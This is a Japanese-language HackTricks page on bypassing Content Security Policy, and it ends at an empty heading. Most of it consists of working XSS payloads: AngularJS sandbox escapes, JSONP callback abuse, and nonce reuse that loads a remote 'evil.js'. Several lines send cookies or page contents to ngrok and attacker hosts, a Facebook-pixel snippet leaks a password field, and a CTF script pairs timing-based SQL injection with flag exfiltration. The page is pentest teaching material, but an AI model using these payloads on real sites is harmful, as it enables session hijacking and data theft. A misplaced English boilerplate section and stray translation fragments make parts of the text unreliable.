# Content Security Policy (CSP) バイパス

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングテクニックを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に深く入り込むコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界の速いペースについていく

**最新のアナウンスメント**\
最新のバグバウンティの開始や重要なプラットフォームのアップデートについて知る

**[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力を始めましょう！

## CSP とは

Content Security Policy（CSP）は、主に **クロスサイトスクリプティング（XSS）などの攻撃から保護する**ことを目的としたブラウザ技術として認識されています。これは、ブラウザが安全に読み込むリソースのパスとソースを定義して詳細に説明することによって機能します。これらのリソースには、画像、フレーム、JavaScriptなどの要素が含まれます。たとえば、ポリシーは、同じドメイン（self）からのリソースの読み込みと実行を許可し、インラインリソースや `eval`、`setTimeout`、`setInterval`などの関数を介して文字列コードの実行を許可する可能性があります。

CSP の実装は、**レスポンスヘッダーを介して**または **HTML ページにメタ要素を組み込むことによって**行われます。このポリシーに従うと、ブラウザはこれらの規定を積極的に強制し、検出された違反を即座にブロックします。
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* メタタグを使用して実装されています：
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### ヘッダー

CSPはこれらのヘッダーを使用して強制または監視できます：

- `Content-Security-Policy`：CSPを強制します。ブラウザは違反をブロックします。
- `Content-Security-Policy-Report-Only`：監視に使用され、違反をブロックせずに報告します。本番環境でのテストに最適です。

### リソースの定義

CSPはアクティブおよびパッシブコンテンツの読み込み元を制限し、インラインJavaScriptの実行や`eval()`の使用などの側面を制御します。例として次のポリシーがあります：
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### ディレクティブ

* **script-src**: URL、インラインスクリプト、およびイベントハンドラやXSLTスタイルシートによってトリガーされるスクリプトを含む、JavaScriptの特定ソースを許可します。
* **default-src**: 特定のフェッチディレクティブが存在しない場合にリソースを取得するためのデフォルトポリシーを設定します。
* **child-src**: ウェブワーカーや埋め込みフレームコンテンツに許可されたリソースを指定します。
* **connect-src**: fetch、WebSocket、XMLHttpRequestなどのインターフェースを使用してロードできるURLを制限します。
* **frame-src**: フレームのためのURLを制限します。
* **frame-ancestors**: `<frame>`、`<iframe>`、`<object>`、`<embed>`、および`<applet>`などの要素に適用され、現在のページを埋め込むことができるソースを指定します。
* **img-src**: 画像の許可されたソースを定義します。
* **font-src**: `@font-face`を使用してロードされるフォントの有効なソースを指定します。
* **manifest-src**: アプリケーションマニフェストファイルの許可されたソースを定義します。
* **media-src**: メディアオブジェクトをロードするための許可されたソースを定義します。
* **object-src**: `<object>`、`<embed>`、および`<applet>`要素の許可されたソースを定義します。
* **base-uri**: `<base>`要素を使用してロードするための許可されたURLを指定します。
* **form-action**: フォーム送信のための有効なエンドポイントをリストします。
* **plugin-types**: ページが呼び出すことができるMIMEタイプを制限します。
* **upgrade-insecure-requests**: ブラウザにHTTP URLをHTTPSに書き換えるよう指示します。
* **sandbox**: `<iframe>`のsandbox属性に類似した制限を適用します。
* **report-to**: ポリシーが違反された場合にレポートが送信されるグループを指定します。
* **worker-src**: Worker、SharedWorker、またはServiceWorkerスクリプトの有効なソースを指定します。
* **prefetch-src**: フェッチまたはプリフェッチされるリソースの有効なソースを指定します。
* **navigate-to**: ドキュメントがどのような手段でナビゲートできるURLを制限します（a、form、window.location、window.openなど）。

### ソース

* `*`: `data:`、`blob:`、`filesystem:`スキームを除くすべてのURLを許可します。
* `'self'`: 同じドメインからの読み込みを許可します。
* `'data'`: データスキームを介してリソースをロードすることを許可します（例：Base64エンコードされた画像）。
* `'none'`: 任意のソースからの読み込みをブロックします。
* `'unsafe-eval'`: `eval()`などの使用を許可しますが、セキュリティ上の理由から推奨されません。
* `'unsafe-hashes'`: 特定のインラインイベントハンドラを有効にします。
* `'unsafe-inline'`: インラインリソース（インラインの`<script>`や`<style>`など）の使用を許可しますが、セキュリティ上の理由から推奨されません。
* `'nonce'`: 暗号的なナンス（一度だけ使用される数値）を使用して特定のインラインスクリプトをホワイトリストに登録します。
* ページ内で使用されたナンスを取得し、悪意のあるスクリプトをロードするために再利用することが可能です（strict-dynamicが使用されている場合、任意の許可されたソースが新しいソースをロードできるため、これは必要ありません）。以下のように：

<details>

<summary>ナンスを再利用してスクリプトをロード</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: 特定のsha256ハッシュを持つスクリプトをホワイトリストに登録します。
* `'strict-dynamic'`: nonceまたはハッシュによってホワイトリストに登録された場合、任意のソースからスクリプトを読み込むことを許可します。
* `'host'`: `example.com`のような特定のホストを指定します。
* `https:`: HTTPSを使用するURLに制限します。
* `blob:`: Blob URL（JavaScriptによって作成されたBlob URLなど）からリソースを読み込むことを許可します。
* `filesystem:`: ファイルシステムからリソースを読み込むことを許可します。
* `'report-sample'`: 違反コードのサンプルを違反レポートに含めます（デバッグに便利）。
* `'strict-origin'`: 'self'と似ていますが、ソースのプロトコルセキュリティレベルがドキュメントと一致することを確認します（セキュアなオリジンのみがセキュアなオリジンからリソースを読み込むことができます）。
* `'strict-origin-when-cross-origin'`: 同一オリジンのリクエストを行う際には完全なURLを送信しますが、クロスオリジンのリクエストの場合はオリジンのみを送信します。
* `'unsafe-allow-redirects'`: 直ちに別のリソースにリダイレクトされるリソースの読み込みを許可します。セキュリティを弱めるため、推奨されません。

## Unsafe CSP Rules

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
動作するペイロード：`"/><script>alert(1);</script>`

#### Iframesを介したself + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
動作するペイロード:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

もし、**許可されたJSコードが新しいスクリプトタグをDOMに作成する**ように何らかの方法でできれば、許可されたスクリプトがそれを作成しているため、**新しいスクリプトタグは実行を許可される**でしょう。

### ワイルドカード (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
動作するペイロード:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-srcとdefault-srcの不足

{% hint style="danger" %}
**この方法はもはや機能していないようです**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
動作するペイロード:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### ファイルアップロード + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
もしJSファイルをアップロードできるなら、このCSPをバイパスできます:

動作するペイロード:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
しかし、サーバーが**アップロードされたファイルを検証**し、**特定の種類のファイルのみをアップロード**できるように制限している可能性が非常に高いです。

さらに、サーバーが受け入れている拡張子を使用してファイル内に**JSコードをアップロード**できたとしても（例: _script.png_）、これだけでは不十分です。なぜなら、Apacheサーバーのような一部のサーバーはファイルの**MIMEタイプを拡張子に基づいて選択**し、Chromeのようなブラウザは画像であるべきものに含まれるJavascriptコードの実行を**拒否**するからです。"幸いにも"、間違いがあります。たとえば、CTFから学んだところによると、**Apacheは**_**.wave**_**拡張子を認識しない**ため、**audio/\***のような**MIMEタイプで提供**されません。

ここから、XSSとファイルアップロードを見つけ、**誤解された拡張子**を見つけることができれば、その拡張子を持つファイルとスクリプトの内容をアップロードしてみることができます。または、サーバーがアップロードされたファイルの正しい形式をチェックしている場合は、ポリグロットを作成することもできます（[ここにいくつかのポリグロットの例があります](https://github.com/Polydet/polyglot-database)）。

### サードパーティのエンドポイント + ('unsafe-eval')

{% hint style="warning" %}
以下のペイロードの一部については、**`unsafe-eval`が必要ない**ことがあります。
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
**Translate:**

```html
Load a vulnerable version of angular and execute arbitrary JS:
```

```html
脆弱性のあるAngularのバージョンを読み込んで任意のJSを実行します：
```
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window`オブジェクトを返す関数を持つライブラリを使用したペイロード（[この投稿をチェック](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)）:

{% hint style="info" %}
この投稿では、`cdn.cloudflare.com`（または他の許可されたJSライブラリリポジトリ）からすべてのライブラリを**ロード**し、各ライブラリから追加されたすべての関数を実行し、**どのライブラリのどの関数が`window`オブジェクトを返すか**を確認できることが示されています。
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Google reCAPTCHA JSコードの悪用

[**このCTF解説**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)によると、CSP内で[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)を悪用して、CSPをバイパスして任意のJSコードを実行できる可能性があります。
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
以下は、この解説からの[**追加のペイロード**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/)です：
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
### サードパーティのエンドポイント + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
以下のようなシナリオでは、`script-src` が `self` と特定のホワイトリストに登録されたドメインに設定されている場合、JSONP を使用してバイパスすることができます。JSONP エンドポイントはセキュリティの弱いコールバックメソッドを許可するため、攻撃者はXSSを実行することができます。有効なペイロード:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **には、さまざまなウェブサイトのCSP バイパス用のJSONP エンドポイントが含まれています。**

同じ脆弱性が発生する可能性があります**信頼されたエンドポイントにオープンリダイレクトが含まれている場合**、初期エンドポイントが信頼されているため、リダイレクトも信頼されます。

### 第三者の悪用

[次の投稿](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)で説明されているように、CSP で許可されている可能性がある多くの第三者ドメインは、データの外部流出やJavaScript コードの実行など、悪用される可能性があります。これらの第三者の一部は次のとおりです：

| エンティティ       | 許可されたドメイン                           | 機能         |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | 外部流出     |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | 外部流出     |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | 実行         |
| Amazon CloudFront | \*.cloudfront.net                            | 外部流出、実行 |
| Amazon AWS        | \*.amazonaws.com                             | 外部流出、実行 |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | 外部流出、実行 |
| Salesforce Heroku | \*.herokuapp.com                             | 外部流出、実行 |
| Google Firebase   | \*.firebaseapp.com                           | 外部流出、実行 |

ターゲットのCSP で許可されているドメインのいずれかを見つけた場合、そのサードパーティサービスに登録して、データを外部流出させるかコードを実行するかを行うことで、CSP をバイパスできる可能性があります。

たとえば、次のCSP を見つけた場合：
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
## Content Security Policy (CSP) Bypass

### Introduction

In some scenarios, you may encounter a website that has a strict Content Security Policy (CSP) in place, which restricts the sources from which certain types of content can be loaded on that website. However, there are ways to bypass CSP protections and execute unauthorized scripts on the website.

### Bypassing CSP with Inline Scripts

One common method to bypass CSP is by injecting inline scripts directly into HTML elements such as `<script>` tags or event handlers. By doing this, you can execute arbitrary code on the website even if CSP is in place.

### Bypassing CSP with Trusted Sources

Another way to bypass CSP is by exploiting trusted sources that are allowed by the policy. If the website allows loading scripts from a specific domain, you can host your malicious script on that domain and execute it on the target website.

### Bypassing CSP with Data URI

Data URIs can also be used to bypass CSP restrictions. By encoding the script in a data URI format, you can embed the script directly into the HTML document without triggering CSP violations.

### Conclusion

Content Security Policy (CSP) is a crucial security mechanism to prevent various types of attacks such as cross-site scripting (XSS). However, understanding how to bypass CSP can help security researchers and penetration testers identify and exploit vulnerabilities in web applications.
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
1. 以下の手順に従って、データを外部に送信することができるはずです。これは、[Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)や[Google Tag Manager](https://blog.deteact.com/csp-bypass/)で常に行われてきた方法と同様です。

2. Facebook Developerアカウントを[こちら](https://developers.facebook.com/)で作成します。

3. "Facebook Login"アプリを作成し、"Website"を選択します。

4. "Settings -> Basic"に移動し、"App ID"を取得します。

5. データを外部に送信したい対象サイトで、Facebook SDKのガジェット "fbq" を使用して直接データを外部に送信することができます。これは "customEvent" とデータペイロードを介して行います。

6. アプリの "Event Manager" に移動し、作成したアプリケーションを選択します（イベントマネージャーは次のようなURLで見つけることができます: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events）。

7. "Test Events" タブを選択して、"あなたの"ウェブサイトから送信されるイベントを確認します。

被害者側では、以下のコードを実行して、Facebookのトラッキングピクセルを初期化し、攻撃者のFacebook Developerアカウントのapp-idを指すようにし、次のようにカスタムイベントを発行します。
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
### 前のテーブルで指定された他の7つのサードパーティドメインに関しては、それらを悪用する方法が他にもたくさんあります。他のサードパーティの悪用に関する追加の説明については、以前の[ブログ投稿](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses)を参照してください。

### RPO（Relative Path Overwrite）を介したバイパス <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

パス制限をバイパスするための前述のリダイレクトに加えて、一部のサーバーで使用できる別のテクニックであるRelative Path Overwrite（RPO）と呼ばれるテクニックがあります。

たとえば、CSPがパス `https://example.com/scripts/react/` を許可している場合、次のようにバイパスできます：
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
ブラウザは最終的に `https://example.com/scripts/angular/angular.js` を読み込みます。

これは、ブラウザにとって、`https://example.com/scripts/react/` の下にある `..%2fangular%2fangular.js` という名前のファイルを読み込んでいるため、CSPに準拠しています。

したがって、それらはそれをデコードし、効果的に `https://example.com/scripts/react/../angular/angular.js` をリクエストし、これは `https://example.com/scripts/angular/angular.js` と同等です。

**ブラウザとサーバー間のURL解釈の不一致を悪用することで、パスのルールをバイパス**することができます。

解決策は、サーバーサイドで `%2f` を `/` として扱わないようにし、ブラウザとサーバー間の一貫した解釈を確保してこの問題を回避することです。

オンライン例:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** が欠落している場合

**base-uri** ディレクティブが欠落している場合、[**dangling markup injection**](../dangling-markup-html-scriptless-injection/) を実行するために悪用できます。

さらに、**ページがNonceを使用して相対パスでスクリプトを読み込んでいる場合**（例：`<script src="/js/app.js">`）、**base** **tag** を悪用して、**あなた自身のサーバーからスクリプトを読み込むことでXSSを達成**することができます。\
脆弱なページが**httpS**で読み込まれている場合は、baseにhttpSのURLを使用してください。
```html
<base href="https://www.attacker.com/">
```
### AngularJS イベント

特定のポリシーであるContent Security Policy (CSP) はJavaScriptイベントを制限する場合があります。しかし、AngularJS は代替としてカスタムイベントを導入しています。イベント内で、AngularJS はネイティブブラウザイベントオブジェクトを参照するユニークなオブジェクト `$event` を提供します。この `$event` オブジェクトはCSP を回避するために悪用される可能性があります。特に、Chrome では `$event/event` オブジェクトには、イベントの実行チェーンに関連するオブジェクト配列を保持する `path` 属性があり、その最後には常に `window` オブジェクトが配置されています。この構造はサンドボックス脱出戦術にとって重要です。

この配列を `orderBy` フィルタに向けることで、その配列を反復処理し、末端要素（`window` オブジェクト）を利用して `alert()` のようなグローバル関数をトリガーすることが可能です。以下に示すコードスニペットは、このプロセスを説明しています。
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
このスニペットは、`ng-focus`ディレクティブの使用法を強調し、`$event.path|orderBy`を使用して`path`配列を操作し、`window`オブジェクトを活用して`alert()`関数を実行し、それによって`document.cookie`を明らかにします。

**他のAngularバイパスを見つける** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJSとホワイトリストされたドメイン
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
## Content Security Policy (CSP) バイパス

Angular JS アプリケーションでスクリプトの読み込みのためにドメインをホワイトリストに登録するCSPポリシーは、コールバック関数の呼び出しと特定の脆弱なクラスを利用することで回避することができます。このテクニックに関する詳細な情報は、[このgitリポジトリ](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)で利用可能な詳細なガイドで確認できます。

動作するペイロード：
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
他のJSONP任意実行エンドポイントは[**こちら**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)で見つけることができます（一部は削除されたり修正されたりしました）

### リダイレクトを介したバイパス

CSPがサーバーサイドのリダイレクトに遭遇した場合、どうなるでしょうか？リダイレクトが許可されていない異なるオリジンにつながる場合、それは失敗します。

ただし、[CSP仕様4.2.2.3. パスとリダイレクト](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects)の説明によると、リダイレクトが異なるパスにつながる場合、元の制限をバイパスできます。

以下は例です：
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
CSPが`https://www.google.com/a/b/c/d`に設定されている場合、パスが考慮されるため、`/test`と`/a/test`の両方のスクリプトがCSPによってブロックされます。

ただし、最終的な`http://localhost:5555/301`は**サーバーサイドで`https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`にリダイレクトされます**。これはリダイレクトであるため、**パスは考慮されず**、**スクリプトがロードされる**ため、パス制限をバイパスできます。

このリダイレクトにより、パスが完全に指定されていてもバイパスされます。

したがって、最良の解決策は、ウェブサイトにオープンリダイレクトの脆弱性がないことを確認し、CSPルールで悪用される可能性のあるドメインがないことを確認することです。

### ダングリングマークアップを使用してCSPをバイパス

[こちらで詳細を読む](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` は、コード内で任意のスクリプトを実行できることを意味し（XSS がコードを実行できる）、`img-src *` は、任意のリソースからの画像をウェブページで使用できることを意味します。

この CSP は、画像を介してデータを外部に流出させることでバイパスできます（この場合、XSS が CSRF を悪用し、ボットによってアクセス可能なページに SQLi が含まれ、画像を介してフラグを抽出します）:
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

この構成を悪用して、**画像内に挿入されたJavaScriptコードを読み込む**こともできます。たとえば、ページがTwitterから画像を読み込むことを許可している場合、**特別な画像**を作成し、Twitterにアップロードして"**unsafe-inline**"を悪用してJSコード（通常のXSSとして）を**実行**し、**画像を読み込み**、そこから**JS**を**抽出**して**実行**することができます：[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Service Workersを使用する

Service Workersの**`importScripts`**関数はCSPに制限されません：

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### ポリシーインジェクション

**調査:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

あなたが送信した**パラメータ**が**ポリシーの宣言内に貼り付けられている**場合、**ポリシー**を**無効にする**ような方法で**ポリシーを変更**できます。これらのバイパスのいずれかを使用して、**スクリプト 'unsafe-inline'**を許可できます：
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
このディレクティブは既存のscript-srcディレクティブを**上書き**します。\
例はこちらで見つけることができます: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edgeでは、CSPに**`;_`**を追加するだけで、**Edge**は**ポリシー全体を無効に**します。\
例: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; XSS経由での攻撃 (iframe) - タイムアタック

ディレクティブ`'unsafe-inline'`が欠けていることに注意してください。\
今回は、被害者に**XSS**を介して**あなたの制御下のページ**を**読み込ませる**ことができます。この時、被害者に情報を抽出したいページにアクセスさせます（**CSRF**）。ページの内容にアクセスすることはできませんが、ページの読み込みにかかる時間を**制御**できれば必要な情報を抽出できます。

今回は、**フラグ**が抽出されます。**charが正しく推測されるたびに**SQLiによる**応答**が**sleep関数**により**時間がかかる**ため、フラグを抽出できます。
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### ブックマークレット経由

この攻撃は、攻撃者がユーザーを説得して、ブラウザのブックマークレット上にリンクをドラッグアンドドロップさせることを含みます。このブックマークレットには、**悪意のあるJavaScript**コードが含まれており、ドラッグ＆ドロップまたはクリックされると、現在のWebウィンドウのコンテキストで実行され、CSPをバイパスしてクッキーやトークンなどの**機密情報を盗み出す**ことができます。

詳細は[**こちらの元のレポートをご覧ください**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)。

### CSP制限によるCSPバイパス

